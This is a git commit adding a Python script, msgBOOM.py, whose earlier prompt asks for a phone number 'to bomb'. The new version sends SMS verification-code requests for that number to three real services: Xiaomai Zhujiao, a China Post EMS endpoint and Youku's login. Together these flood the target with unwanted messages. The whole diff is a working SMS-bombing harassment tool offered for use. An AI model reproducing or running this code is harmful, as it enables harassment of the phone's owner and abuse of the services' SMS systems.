2ca9248d409b7691b15fca27a8090a5bbdb5d4dc
陈二爷 <36294803+z52c@users.noreply.github.com>
2020-07-26 23:50:55 +0800

    Add files via upload

--- msgBOOM.py
+++ msgBOOM.py
@@ -1,7 +1,27 @@
 import requests
 
-phoneNumber=input('输入要轰炸的手机号码')
-#小麦助教
-a=requests.post('https://api-b.xiaomai5.com/b/send/authcode?p=w',{'phone':phoneNumber})
 
-#http://baoming.ocean-ad.top/reg
+
+def xiaomaizhujiao(phoneNumber):
+    a = requests.post('https://api-b.xiaomai5.com/b/send/authcode?p=w',{'phone':phoneNumber})
+    print('xiaomaizhujiao:' + a.text)
+
+
+def youzhengEMS(phoneNumber):
+    url = 'http://211.156.201.12:8088/youzheng/ems/security?phone=' + phoneNumber 
+    a = requests.get(url)
+    print('youzhengEMS:' + a.text)
+
+
+def youkuLogin(phoneNumber):
+    a = requests.post('https://cnpassport.youku.com/newlogin/sms/send.do?appName=youku&fromSite=23',{'phoneCode':'86','loginId':phoneNumber,'countryCode':'CN'})
+    print('youkuLogin:' + a.text)
+
+
+
+
+if __name__ == '__main__':
+    phoneNumber = input('输入电话号码：')
+    xiaomaizhujiao(phoneNumber)
+    youzhengEMS(phoneNumber)
+    youkuLogin(phoneNumber)
